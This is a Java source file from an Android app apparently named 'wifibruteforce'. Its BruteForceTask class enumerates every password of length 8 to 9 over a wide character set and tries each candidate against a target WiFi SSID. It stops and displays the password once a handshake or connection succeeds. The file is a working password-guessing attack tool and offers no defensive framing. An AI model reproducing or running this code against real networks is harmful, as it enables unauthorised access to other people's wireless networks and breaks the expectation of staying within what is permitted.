package com.nguyen.wifibruteforce;

import android.app.Activity;
import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.SupplicantState;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;
import android.util.Log;
import android.widget.TextView;
import android.widget.Toast;

import static android.content.Context.WIFI_SERVICE;


public class BruteForceTask extends AsyncTask<String, Integer, Integer> {

    //    private final char[] charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".toCharArray();
    private final char[] charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_+=~`[]{}|\\:;\"'<>,.?/ ".toCharArray();

    private int lengthMin;
    private int lengthMax;

    private Activity activity;
    private String foundPass;

    public BruteForceTask(Activity activity) {
        this.activity = activity;

        setLengthMin(8);
        setLengthMax(9);    //TODO: user can set
    }

    public int getLengthMin() {
        return lengthMin;
    }

    public void setLengthMin(int lengthMin) {
        this.lengthMin = lengthMin;
    }

    public int getLengthMax() {
        return lengthMax;
    }

    public void setLengthMax(int lengthMax) {
        this.lengthMax = lengthMax;
    }

    @Override
    protected void onPreExecute() {
        super.onPreExecute();
    }

    @Override
    protected Integer doInBackground(String... strings) {
        //strings[0]: ssid
        int count = 1;
        String check = "";
        String check1 = "";
        String testPass;

        //set label for loop (break [label]; - break the labeled loop)
        outerloop:
        for (int length = getLengthMin(); length <= getLengthMax(); length++) {
            final double NUMBER_OF_PERMUTATIONS = Math.pow(charset.length, length);

            char[] pass = new char[length];
//            Arrays.fill(temp, 'a');

            for (int i = 0; i < NUMBER_OF_PERMUTATIONS; i++) {
                int n = i;
                for (int k = 0; k < length; k++) {
                    pass[k] = charset[n % charset.length];
                    testPass = String.valueOf(pass);
                    n /= charset.length;
                    if (!testPass.contains("\u0000") &&     // "\u0000" is default value of a char but ("\u0000" == null) return false
                            !check1.equals(testPass) &&
                            !check.equals(testPass)) {

//                        System.out.println(testPass);   //output string

                        Utils.finallyConnect(testPass, strings[0], activity);
                        Log.d("running", testPass);

                        publishProgress(count);
                        count += 1;

                        if (isCancelled()) {
                            Log.d("running", "isCancelled_BF");
                            break outerloop;
                        }

                        try {
                            int countSleep = 0;
                            while (countSleep < 9 && ConnectivityReceiver.group_handshake != 1) {
                                Thread.sleep(1000);
                                countSleep++;
                            }
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                        if (ConnectivityReceiver.group_handshake == 1) {
                            Log.d("running", "success: " + testPass);
                            foundPass = testPass;
                            break outerloop;
                        }

                        ConnectivityManager cm = (ConnectivityManager) activity.getSystemService(Context.CONNECTIVITY_SERVICE);
                        assert cm != null;
                        NetworkInfo ni = cm.getActiveNetworkInfo();
                        if (Utils.isConnectAccessPoint(activity.getApplicationContext())
                                && Utils.convertSSID(ni.getExtraInfo()).equals(strings[0])) {
                            Log.d("running", Utils.convertSSID(ni.getExtraInfo()) + "/" + strings[0] + "/pass: " + testPass);
                            foundPass = testPass;
//                Log.d("running", "pass for Toast: " + foundPass);
                            break outerloop;
                        }
                    }
                    //check duplicate values
                    if (pass[0] == charset[0]) {
                        check1 = testPass;
                    }
                    check = testPass;
                }
            }
        }
        return null;
    }

    @Override
    protected void onProgressUpdate(Integer... values) {
        super.onProgressUpdate(values);
        TextView txtPassCount = activity.findViewById(R.id.txtPassCount);
        txtPassCount.setText(values[0] + "");
    }


    @Override
    protected void onPostExecute(Integer integer) {
        super.onPostExecute(integer);
        Toast.makeText(activity.getApplicationContext(), activity.getString(R.string.pass_found) + foundPass, Toast.LENGTH_LONG).show();
        activity.finish();
    }
}
